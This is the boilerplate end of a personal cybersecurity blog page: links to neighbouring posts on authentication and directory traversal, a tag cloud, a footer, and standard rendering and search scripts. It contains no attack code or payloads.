class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Vulnerable_Username_and_Password_Authentication-copy/" class="btn btn-outline-primary" prompt="Older"><p>Vulnerable Username-Password Authentication</p></a> <a href="/posts/Directory_Traversal/" class="btn btn-outline-primary" prompt="Newer"><p>Directory Traversal</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
